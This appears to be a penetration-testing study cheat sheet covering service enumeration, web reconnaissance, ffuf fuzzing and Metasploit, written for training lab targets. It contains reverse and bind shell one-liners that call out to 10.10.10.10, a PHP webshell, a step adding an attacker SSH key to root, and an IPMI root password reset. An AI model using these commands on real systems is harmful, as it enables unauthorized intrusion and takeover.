
## Generic cheat sheet

### Basic Tools

|**Command**|**Description**|
|---|---|
|**General**||
|`sudo openvpn user.ovpn`|Connect to VPN|
|`ifconfig`/`ip a`|Show our IP address|
|`netstat -rn`|Show networks accessible via the VPN|
|`ssh user@10.10.10.10`|SSH to a remote server|
|`ftp 10.129.42.253`|FTP to a remote server|
|**tmux**||
|`tmux`|Start tmux|
|`ctrl+b`|tmux: default prefix|
|`prefix c`|tmux: new window|
|`prefix 1`|tmux: switch to window (`1`)|
|`prefix shift+%`|tmux: split pane vertically|
|`prefix shift+"`|tmux: split pane horizontally|
|`prefix ->`|tmux: switch to the right pane|
|**Vim**||
|`vim file`|vim: open `file` with vim|
|`esc+i`|vim: enter `insert` mode|
|`esc`|vim: back to `normal` mode|
|`x`|vim: Cut character|
|`dw`|vim: Cut word|
|`dd`|vim: Cut full line|
|`yw`|vim: Copy word|
|`yy`|vim: Copy full line|
|`p`|vim: Paste|
|`:1`|vim: Go to line number 1.|
|`:w`|vim: Write the file 'i.e. save'|
|`:q`|vim: Quit|
|`:q!`|vim: Quit without saving|
|`:wq`|vim: Write and quit|

### Pentesting

| **Command**                                                                           | **Description**                                                       |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Service Scanning**                                                                  |                                                                       |
| `nmap 10.129.42.253`                                                                  | Run nmap on an IP                                                     |
| `nmap -sV -sC -p- 10.129.42.253`                                                      | Run an nmap script scan on an IP                                      |
| `locate scripts/citrix`                                                               | List various available nmap scripts                                   |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Run an nmap script on an IP                                           |
| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                           |
| `smbclient -N -L \\\\10.129.42.253`                                                   | List SMB Shares                                                       |
| `smbclient \\\\10.129.42.253\\users`                                                  | Connect to an SMB share                                               |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Scan SNMP on an IP                                                    |
| `onesixtyone -c dict.txt 10.129.42.254`                                               | Brute force SNMP secret string                                        |
| **Web Enumeration**                                                                   |                                                                       |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Run a directory scan on a website                                     |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website                                    |
| `curl -IL https://www.inlanefreight.com`                                              | Grab website banner                                                   |
| `whatweb 10.10.10.121`                                                                | List details about the webserver/certificates                         |
| `curl 10.10.10.121/robots.txt`                                                        | List potential directories in `robots.txt`                            |
| `ctrl+U`                                                                              | View page source (in Firefox)                                         |
| **Public Exploits**                                                                   |                                                                       |
| `searchsploit openssh 7.2`                                                            | Search for public exploits for a web application                      |
| `msfconsole`                                                                          | MSF: Start the Metasploit Framework                                   |
| `search exploit eternalblue`                                                          | MSF: Search for public exploits in MSF                                |
| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: Start using an MSF module                                        |
| `show options`                                                                        | MSF: Show required options for an MSF module                          |
| `set RHOSTS 10.10.10.40`                                                              | MSF: Set a value for an MSF module option                             |
| `check`                                                                               | MSF: Test if the target server is vulnerable                          |
| `exploit`                                                                             | MSF: Run the exploit on the target server is vulnerable               |
| **Using Shells**                                                                      |                                                                       |
| `nc -lvnp 1234`                                                                       | Start a `nc` listener on a local port                                 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Send a reverse shell from the remote server                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`    | Another command to send a reverse shell from the remote server        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`         | Start a bind shell on the remote server                               |
| `nc 10.10.10.1 1234`                                                                  | Connect to a bind shell started on the remote server                  |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Upgrade shell TTY (1)                                                 |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                           | Upgrade shell TTY (2)                                                 |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Create a webshell php file                                            |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Execute a command on an uploaded webshell                             |
| **Privilege Escalation**                                                              |                                                                       |
| `./linpeas.sh`                                                                        | Run `linpeas` script to enumerate remote server                       |
| `sudo -l`                                                                             | List available `sudo` privileges                                      |
| `sudo -u user /bin/echo Hello World!`                                                 | Run a command with `sudo`                                             |
| `sudo su -`                                                                           | Switch to root user (if we have access to `sudo su`)                  |
| `sudo su user -`                                                                      | Switch to a user (if we have access to `sudo su`)                     |
| `ssh-keygen -f key`                                                                   | Create a new SSH key                                                  |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Add the generated public key to the user                              |
| `ssh root@10.10.10.10 -i key`                                                         | SSH to the server with the generated private key                      |
| **Transferring Files**                                                                |                                                                       |
| `python3 -m http.server 8000`                                                         | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Download a file on the remote server from our local machine           |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0`                                                                   | Convert a file to `base64`                                            |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                     | Convert a file from `base64` back to its orig                         |
| `md5sum shell`                                                                        | Check the file's `md5sum` to ensure it converted correctly            |


##  Infrastructure-based Enumeration

| **Command**                                                         | **Description**                              |
| ------------------------------------------------------------------- | -------------------------------------------- |
| `curl -s https://crt.sh/\?q\=<target-domain>\&output\=json \| jq .` | Certificate transparency.                    |
| `for i in $(cat ip-addresses.txt);do shodan host $i;done`           | Scan each IP address in a list using Shodan. |

### Host-based Enumeration

##### FTP

|**Command**|**Description**|
|---|---|
|`ftp <FQDN/IP>`|Interact with the FTP service on the target.|
|`nc -nv <FQDN/IP> 21`|Interact with the FTP service on the target.|
|`telnet <FQDN/IP> 21`|Interact with the FTP service on the target.|
|`openssl s_client -connect <FQDN/IP>:21 -starttls ftp`|Interact with the FTP service on the target using encrypted connection.|
|`wget -m --no-passive ftp://anonymous:anonymous@<target>`|Download all available files on the target FTP server.|

##### SMB

|**Command**|**Description**|
|---|---|
|`smbclient -N -L //<FQDN/IP>`|Null session authentication on SMB.|
|`smbclient //<FQDN/IP>/<share>`|Connect to a specific SMB share.|
|`rpcclient -U "" <FQDN/IP>`|Interaction with the target using RPC.|
|`samrdump.py <FQDN/IP>`|Username enumeration using Impacket scripts.|
|`smbmap -H <FQDN/IP>`|Enumerating SMB shares.|
|`crackmapexec smb <FQDN/IP> --shares -u '' -p ''`|Enumerating SMB shares using null session authentication.|
|`enum4linux-ng.py <FQDN/IP> -A`|SMB enumeration using enum4linux.|

##### NFS

| **Command**                                               | **Description**                                  |
| --------------------------------------------------------- | ------------------------------------------------ |
| `showmount -e <FQDN/IP>`                                  | Show available NFS shares.                       |
| `mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount the specific NFS share.umount ./target-NFS |
| `umount ./target-NFS`                                     | Unmount the specific NFS share.                  |

##### DNS

|**Command**|**Description**|
|---|---|
|`dig ns <domain.tld> @<nameserver>`|NS request to the specific nameserver.|
|`dig any <domain.tld> @<nameserver>`|ANY request to the specific nameserver.|
|`dig axfr <domain.tld> @<nameserver>`|AXFR request to the specific nameserver.|
|`dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list <domain.tld>`|Subdomain brute forcing.|

##### SMTP

| **Command**                                                                    | **Description**        |
| ------------------------------------------------------------------------------ | ---------------------- |
| `telnet <FQDN/IP> 25`                                                          |                        |
| sudo nmap $ip -sC -sV -p25                                                     | Enumerate SMTP service |
| for user in $(cat users.txt); do echo VRFY $user \| nc -nv -w 6 $ip 25  ; done | Enumerate users        |

##### IMAP/POP3

| **Command**                                            | **Description**                         |
| ------------------------------------------------------ | --------------------------------------- |
| `openssl s_client -connect <FQDN/IP>:imaps`            | Connect to the IMAPS service.           |
| `openssl s_client -connect <FQDN/IP>:pop3s`            | Connect to the POP3s service.           |
After connection is established, see the IMAP and POP3 commands:

```
############
IMAP commandCACCs
############
# User's login
a LOGIN username password

# Lists all directories
a LIST "" *

# Creates a mailbox with a specified name
a CREATE "INBOX" 

# Deletes a mailbox
a DELETE "INBOX" 

# Renames a mailbox
a RENAME "ToRead" "Important"

# Returns a subset of names from the set of names that the User has declared as being active or subscribed
a LSUB "" *

# Selects a mailbox so that messages in the mailbox can be accessed
a SELECT INBOX

# Exits the selected mailbox
a UNSELECT INBOX

# Retrieves data (parts of the message) associated with a message in the mailbox
a FETCH <ID> all
# If you want to retrieve the body:
a FETCH <ID> BODY.PEEK[TEXT]

# Removes all messages with the `Deleted` flag set
a CLOSE

# Closes the connection with the IMAP server
a LOGOUT
```


```bash
############
POP3 Commands
############


# Identifies the user
USER username

# Authentication of the user using its password
PASS password

# Requests the number of saved emails from the server
STAT

# Requests from the server the number and size of all emails
LIST 

# Requests the server to deliver the requested email by ID
RETR id

# Requests the server to delete the requested email by ID
DELE id

# Requests the server to display the server capabilities
CAPA

# Requests the server to reset the transmitted information
RSET

# Closes the connection with the POP3 server
QUIT
```

| **Command**                                               | **Description**                                                                                    |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| sudo nmap $ip -sV -p110,143,993,995 -sC`                  | Footprinting the service                                                                           |
| `curl -v -k 'imaps://<FQDN/IP>' --user <user>:<password>` | Log in to the IMAPS service using cURL. -v is the verbose option to see how the connection is made |

After connection is established, see the IMAP and POP3 commands:

##### SNMP

| **Command**                                       | **Description**                                     |
| ------------------------------------------------- | --------------------------------------------------- |
| `snmpwalk -v2c -c <community string> <FQDN/IP>`   | Querying OIDs using snmpwalk.                       |
| `onesixtyone -c community-strings.list <FQDN/IP>` | Bruteforcing community strings of the SNMP service. |
| `braa <community string>@<FQDN/IP>:.1.*`          | Bruteforcing SNMP service OIDs.                     |



#### SQL

| **Command**                                                 | **Description**                              |
| ----------------------------------------------------------- | -------------------------------------------- |
| <br>sudo nmap $ip -sV -sC -p3306 --script mysql*            | Footprinting the service                     |
| sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip | Run script for checking out empty passwords. |

##### MySQL

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
|                                                      |                                                                                                       |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected database.                                                            |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |
##### MSSQL

| **Command**                                                                                                                                                                                                                                                                                 | **Description**                                          |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip` | Enumerate                                                |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth`                                                                                                                                                                                                                                             | Log in to the MSSQL server using Windows authentication. |

```
# Get Microsoft SQL server version
select @@version;

# Get usernames
select user_name()
go 

# Get databases
SELECT name FROM master.dbo.sysdatabases
go

# Get current database
SELECT DB_NAME()
go

# Get a list of users in the domain
SELECT name FROM master..syslogins
go

# Get a list of users that are sysadmins
SELECT name FROM master..syslogins WHERE sysadmin = 1
go

# And to make sure: 
SELECT is_srvrolemember(‘sysadmin’)
go
# If your user is admin, it will return 1.

# Read Local Files in MSSQL
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```


#### Oracle TNS

| **Command**                                                                                                                  | **Description**                                                                                         |
| ---------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `python3 ./odat.py all -s <FQDN/IP>`                                                                                         | Perform a variety of scans to gather information about the Oracle database services and its components. |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>`                                                                                       | Log in to the Oracle database.                                                                          |
| `python3 ./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | Upload a file with Oracle RDBMS.                                                                        |


#### IPMI

| **Command**                                                                                            | **Description**                                                                                                                                         |
| ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| nmap -n-sU -p 623 $ip/24                                                                               | Enumerate in a network range                                                                                                                            |
| sudo nmap -sU --script ipmi* -p 623 $ip                                                                | Run all nmap scripts related to ipmi protocol                                                                                                           |
| `msf6 auxiliary(scanner/ipmi/ipmi_version)`                                                            | IPMI version detection.                                                                                                                                 |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)`                                                         | Dump IPMI hashes. Similar to the The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack                                                 |
| apt-get install ipmitool<br>ipmitool -I lanplus -C 0 -H  $ip -U root -P root user list                 | **The IPMI Authentication Bypass via Cipher 0 attack**<br>Install ipmitool and use Cipher 0 to dump a list of users. With -C 0 any password is accepted |
| apt-get install ipmitool<br>ipmitool -I lanplus -C 0 -H $ip -U root -P root user set password 2 abc123 | **The IPMI 2.0 RAKP Authentication Remote Password Hash Retrieval attack** <br>Install ipmitool and change the password of root                         |
|                                                                                                        | **The IPMI Anonymous Authentication attack**                                                                                                            |

### Linux Remote Management

| **Command**                                                 | **Description**                                       |
| ----------------------------------------------------------- | ----------------------------------------------------- |
| `ssh-audit.py <FQDN/IP>`                                    | Remote security audit against the target SSH service. |
| `ssh <user>@<FQDN/IP>`                                      | Log in to the SSH server using the SSH client.        |
| `ssh -i private.key <user>@<FQDN/IP>`                       | Log in to the SSH server using private key.           |
| `ssh <user>@<FQDN/IP> -o PreferredAuthentications=password` | Enforce password-based authentication.                |

### Windows Remote Management

#### [RDP](3389-rdp.md)

| **Command**                                                                                                      | **Description**                                                                                                                                                                                                                                                                  |
| ---------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| nmap -Pn -sV -p3389 --script rdp-*  $ip                                                                          | Footprinting RDP                                                                                                                                                                                                                                                                 |
| git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check<br><br>./rdp-sec-check.pl $ip | A Perl script named [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) has also been developed by [Cisco CX Security Labs](https://github.com/CiscoCXSecurity) that can unauthentically identify the security settings of RDP servers based on the handshakes. |
| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>`                                                                | Log in to the RDP server from Linux.                                                                                                                                                                                                                                             |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"`                                                    | Execute command using the WMI service.                                                                                                                                                                                                                                           |


#### [WinRM](5985-5986-winrm-windows-remote-management.md)

| **Command**                                        | **Description**             |
| -------------------------------------------------- | --------------------------- |
| nmap -sV -sC $ip -p5985,5986 --disable-arp-ping -n | Footprinting WinRM          |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`  | Log in to the WinRM server. |

#### [WMI](135-windows-management-instrumentation-wmi.md)

| **Command**                                                   | **Description**                        |
| ------------------------------------------------------------- | -------------------------------------- |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>`             | Log in to the WinRM server.            |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | Execute command using the WMI service. |


## Information gathering

Web reconnaissance is the first step in any security assessment or penetration testing engagement. It's akin to a detective's initial investigation, meticulously gathering clues and evidence about a target before formulating a plan of action. In the digital realm, this translates to accumulating information about a website or web application to identify potential vulnerabilities, security misconfigurations, and valuable assets.

The primary goals of web reconnaissance revolve around gaining a comprehensive understanding of the target's digital footprint. This includes:

- `Identifying Assets`: Discovering all associated domains, subdomains, and IP addresses provides a map of the target's online presence.
- `Uncovering Hidden Information`: Web reconnaissance aims to uncover directories, files, and technologies that are not readily apparent and could serve as entry points for an attacker.
- `Analyzing the Attack Surface`: By identifying open ports, running services, and software versions, you can assess the potential vulnerabilities and weaknesses of the target.
- `Gathering Intelligence`: Collecting information about employees, email addresses, and technologies used can aid in social engineering attacks or identifying specific vulnerabilities associated with certain software.

Web reconnaissance can be conducted using either active or passive techniques, each with its own advantages and drawbacks:

|Type|Description|Risk of Detection|Examples|
|---|---|---|---|
|Active Reconnaissance|Involves directly interacting with the target system, such as sending probes or requests.|Higher|Port scanning, vulnerability scanning, network mapping|
|Passive Reconnaissance|Gathers information without directly interacting with the target, relying on publicly available data.|Lower|Search engine queries, WHOIS lookups, DNS enumeration, web archive analysis, social media|

### WHOIS

WHOIS is a query and response protocol used to retrieve information about domain names, IP addresses, and other internet resources. It's essentially a directory service that details who owns a domain, when it was registered, contact information, and more. In the context of web reconnaissance, WHOIS lookups can be a valuable source of information, potentially revealing the identity of the website owner, their contact information, and other details that could be used for further investigation or social engineering attacks.

For example, if you wanted to find out who owns the domain `example.com`, you could run the following command in your terminal:

Code: bash

```bash
whois example.com
```

This would return a wealth of information, including the registrar, registration, and expiration dates, nameservers, and contact information for the domain owner.

However, it's important to note that WHOIS data can be inaccurate or intentionally obscured, so it's always wise to verify the information from multiple sources. Privacy services can also mask the true owner of a domain, making it more difficult to obtain accurate information through WHOIS.

### DNS

The Domain Name System (DNS) functions as the internet's GPS, translating user-friendly domain names into the numerical IP addresses computers use to communicate. Like GPS converting a destination's name into coordinates, DNS ensures your browser reaches the correct website by matching its name with its IP address. This eliminates memorizing complex numerical addresses, making web navigation seamless and efficient.

The `dig` command allows you to query DNS servers directly, retrieving specific information about domain names. For instance, if you want to find the IP address associated with `example.com`, you can execute the following command:

Code: bash

```bash
dig example.com A
```

This command instructs `dig` to query the DNS for the `A` record (which maps a hostname to an IPv4 address) of `example.com`. The output will typically include the requested IP address, along with additional details about the query and response. By mastering the `dig` command and understanding the various DNS record types, you gain the ability to extract valuable information about a target's infrastructure and online presence.

DNS servers store various types of records, each serving a specific purpose:

|Record Type|Description|
|---|---|
|A|Maps a hostname to an IPv4 address.|
|AAAA|Maps a hostname to an IPv6 address.|
|CNAME|Creates an alias for a hostname, pointing it to another hostname.|
|MX|Specifies mail servers responsible for handling email for the domain.|
|NS|Delegates a DNS zone to a specific authoritative name server.|
|TXT|Stores arbitrary text information.|
|SOA|Contains administrative information about a DNS zone.|

### Subdomains

Subdomains are essentially extensions of a primary domain name, often used to organize different sections or services within a website. For example, a company might use `mail.example.com` for their email server or `blog.example.com` for their blog.

From a reconnaissance perspective, subdomains are incredibly valuable. They can expose additional attack surfaces, reveal hidden services, and provide clues about the internal structure of a target's network. Subdomains might host development servers, staging environments, or even forgotten applications that haven't been properly secured.

The process of discovering subdomains is known as subdomain enumeration. There are two main approaches to subdomain enumeration:

|Approach|Description|Examples|
|---|---|---|
|`Active Enumeration`|Directly interacts with the target's DNS servers or utilizes tools to probe for subdomains.|Brute-forcing, DNS zone transfers|
|`Passive Enumeration`|Collects information about subdomains without directly interacting with the target, relying on public sources.|Certificate Transparency (CT) logs, search engine queries|

`Active enumeration` can be more thorough but carries a higher risk of detection. Conversely, `passive enumeration` is stealthier but may not uncover all subdomains. Combining both techniques can significantly increase the likelihood of discovering a comprehensive list of subdomains associated with your target, expanding your understanding of their online presence and potential vulnerabilities.

#### Subdomain Brute-Forcing

Subdomain brute-forcing is a proactive technique used in web reconnaissance to uncover subdomains that may not be readily apparent through passive methods. It involves systematically generating many potential subdomain names and testing them against the target's DNS server to see if they exist. This approach can unveil hidden subdomains that may host valuable information, development servers, or vulnerable applications.

One of the most versatile tools for subdomain brute-forcing is `dnsenum`. This powerful command-line tool combines various DNS enumeration techniques, including dictionary-based brute-forcing, to uncover subdomains associated with your target.

To use `dnsenum` for subdomain brute-forcing, you'll typically provide it with the target domain and a wordlist containing potential subdomain names. The tool will then systematically query the DNS server for each potential subdomain and report any that exist.

For example, the following command would attempt to brute-force subdomains of `example.com` using a wordlist named `subdomains.txt`:

Code: bash

```bash
dnsenum example.com -f subdomains.txt
```

#### Zone Transfers

DNS zone transfers, also known as AXFR (Asynchronous Full Transfer) requests, offer a potential goldmine of information for web reconnaissance. A zone transfer is a mechanism for replicating DNS data across servers. When a zone transfer is successful, it provides a complete copy of the DNS zone file, which contains a wealth of details about the target domain.

This zone file lists all the domain's subdomains, their associated IP addresses, mail server configurations, and other DNS records. This is akin to obtaining a blueprint of the target's DNS infrastructure for a reconnaissance expert.

To attempt a zone transfer, you can use the `dig` command with the `axfr` (full zone transfer) option. For example, to request a zone transfer from the DNS server `ns1.example.com` for the domain `example.com`, you would execute:

Code: bash

```bash
dig @ns1.example.com example.com axfr
```

However, zone transfers are not always permitted. Many DNS servers are configured to restrict zone transfers to authorized secondary servers only. Misconfigured servers, though, may allow zone transfers from any source, inadvertently exposing sensitive information.

#### Virtual Hosts

Virtual hosting is a technique that allows multiple websites to share a single IP address. Each website is associated with a unique hostname, which is used to direct incoming requests to the correct site. This can be a cost-effective way for organizations to host multiple websites on a single server, but it can also create a challenge for web reconnaissance.

Since multiple websites share the same IP address, simply scanning the IP won't reveal all the hosted sites. You need a tool that can test different hostnames against the IP address to see which ones respond.

Gobuster is a versatile tool that can be used for various types of brute-forcing, including virtual host discovery. Its `vhost` mode is designed to enumerate virtual hosts by sending requests to the target IP address with different hostnames. If a virtual host is configured for a specific hostname, Gobuster will receive a response from the web server.

To use Gobuster to brute-force virtual hosts, you'll need a wordlist containing potential hostnames. Here's an example command:

Code: bash

```bash
gobuster vhost -u http://192.0.2.1 -w hostnames.txt
```

In this example, `-u` specifies the target IP address, and `-w` specifies the wordlist file. Gobuster will then systematically try each hostname in the wordlist and report any that results in a valid response from the web server.

#### Certificate Transparency (CT) Logs

Certificate Transparency (CT) logs offer a treasure trove of subdomain information for passive reconnaissance. These publicly accessible logs record SSL/TLS certificates issued for domains and their subdomains, serving as a security measure to prevent fraudulent certificates. For reconnaissance, they offer a window into potentially overlooked subdomains.

The `crt.sh` website provides a searchable interface for CT logs. To efficiently extract subdomains using `crt.sh` within your terminal, you can use a command like this:

Code: bash

```bash
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

This command fetches JSON-formatted data from `crt.sh` for `example.com` (the `%` is a wildcard), extracts domain names using `jq`, removes any wildcard prefixes (`*.`) with `sed`, and finally sorts and deduplicates the results.

### Web Crawling

Web crawling is the automated exploration of a website's structure. A web crawler, or spider, systematically navigates through web pages by following links, mimicking a user's browsing behavior. This process maps out the site's architecture and gathers valuable information embedded within the pages.

A crucial file that guides web crawlers is `robots.txt`. This file resides in a website's root directory and dictates which areas are off-limits for crawlers. Analyzing `robots.txt` can reveal hidden directories or sensitive areas that the website owner doesn't want to be indexed by search engines.

`Scrapy` is a powerful and efficient Python framework for large-scale web crawling and scraping projects. It provides a structured approach to defining crawling rules, extracting data, and handling various output formats.

Here's a basic Scrapy spider example to extract links from `example.com`:

Code: python

```python
import scrapy

class ExampleSpider(scrapy.Spider):
    name = "example"
    start_urls = ['http://example.com/']

    def parse(self, response):
        for link in response.css('a::attr(href)').getall():
            if any(link.endswith(ext) for ext in self.interesting_extensions):
                yield {"file": link}
            elif not link.startswith("#") and not link.startswith("mailto:"):
                yield response.follow(link, callback=self.parse)
```

After running the Scrapy spider, you'll have a file containing scraped data (e.g., `example_data.json`). You can analyze these results using standard command-line tools. For instance, to extract all links:

Code: bash

```bash
jq -r '.[] | select(.file != null) | .file' example_data.json | sort -u
```

This command uses `jq` to extract links, `awk` to isolate file extensions, `sort` to order them, and `uniq -c` to count their occurrences. By scrutinizing the extracted data, you can identify patterns, anomalies, or sensitive files that might be of interest for further investigation.

### Search Engine Discovery

Leveraging search engines for reconnaissance involves utilizing their vast indexes of web content to uncover information about your target. This passive technique, often referred to as Open Source Intelligence (OSINT) gathering, can yield valuable insights without directly interacting with the target's systems.

By employing advanced search operators and specialized queries known as "Google Dorks," you can pinpoint specific information buried within search results. Here's a table of some useful search operators for web reconnaissance:

|Operator|Description|Example|
|---|---|---|
|`site:`|Restricts search results to a specific website.|`site:example.com "password reset"`|
|`inurl:`|Searches for a specific term in the URL of a page.|`inurl:admin login`|
|`filetype:`|Limits results to files of a specific type.|`filetype:pdf "confidential report"`|
|`intitle:`|Searches for a term within the title of a page.|`intitle:"index of" /backup`|
|`cache:`|Shows the cached version of a webpage.|`cache:example.com`|
|`"search term"`|Searches for the exact phrase within quotation marks.|`"internal error" site:example.com`|
|`OR`|Combines multiple search terms.|`inurl:admin OR inurl:login`|
|`-`|Excludes specific terms from search results.|`inurl:admin -intext:wordpress`|

By creatively combining these operators and crafting targeted queries, you can uncover sensitive documents, exposed directories, login pages, and other valuable information that may aid in your reconnaissance efforts.

### Web Archives

Web archives are digital repositories that store snapshots of websites across time, providing a historical record of their evolution. Among these archives, the Wayback Machine is the most comprehensive and accessible resource for web reconnaissance.

The Wayback Machine, a project by the Internet Archive, has been archiving the web for over two decades, capturing billions of web pages from across the globe. This massive historical data collection can be an invaluable resource for security researchers and investigators.

|Feature|Description|Use Case in Reconnaissance|
|---|---|---|
|`Historical Snapshots`|View past versions of websites, including pages, content, and design changes.|Identify past website content or functionality that is no longer available.|
|`Hidden Directories`|Explore directories and files that may have been removed or hidden from the current version of the website.|Discover sensitive information or backups that were inadvertently left accessible in previous versions.|
|`Content Changes`|Track changes in website content, including text, images, and links.|Identify patterns in content updates and assess the evolution of a website's security posture.|

By leveraging the Wayback Machine, you can gain a historical perspective on your target's online presence, potentially revealing vulnerabilities that may have been overlooked in the current version of the website.


## Fuzzing with Ffuf

|**Command**|**Description**|
|---|---|
|`ffuf -h`|ffuf help|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`|Directory Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`|Extension Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`|Page Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`|Recursive Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`|Sub-domain Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`|VHost Fuzzing|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`|Parameter Fuzzing - GET|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Parameter Fuzzing - POST|
|`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|Value Fuzzing|

### Wordlists

|**Command**|**Description**|
|---|---|
|`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`|Directory/Page Wordlist|
|`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`|Extensions Wordlist|
|`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`|Domain Wordlist|
|`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`|Parameters Wordlist|

### Misc

|**Command**|**Description**|
|---|---|
|`sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`|Add DNS entry|
|`for i in $(seq 1 1000); do echo $i >> ids.txt; done`|Create Sequence Wordlist|
|`curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'`|curl w/ POST|


## Metasploit

### MSFconsole Commands

|**Command**|**Description**|
|:--|:--|
|`show exploits`|Show all exploits within the Framework.|
|`show payloads`|Show all payloads within the Framework.|
|`show auxiliary`|Show all auxiliary modules within the Framework.|
|`search <name>`|Search for exploits or modules within the Framework.|
|`info`|Load information about a specific exploit or module.|
|`use <name>`|Load an exploit or module (example: use windows/smb/psexec).|
|`use <number>`|Load an exploit by using the index number displayed after the search command.|
|`LHOST`|Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.|
|`RHOST`|The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).|
|`setg <function>`|Set a specific value globally (for example, LHOST or RHOST).|
|`show options`|Show the options available for a module or exploit.|
|`show targets`|Show the platforms supported by the exploit.|
|`set target <number>`|Specify a specific target index if you know the OS and service pack.|
|`set payload <payload>`|Specify the payload to use.|
|`set payload <number>`|Specify the payload index number to use after the show payloads command.|
|`show advanced`|Show advanced options.|
|`set autorunscript migrate -f`|Automatically migrate to a separate process upon exploit completion.|
|`check`|Determine whether a target is vulnerable to an attack.|
|`exploit`|Execute the module or exploit and attack the target.|
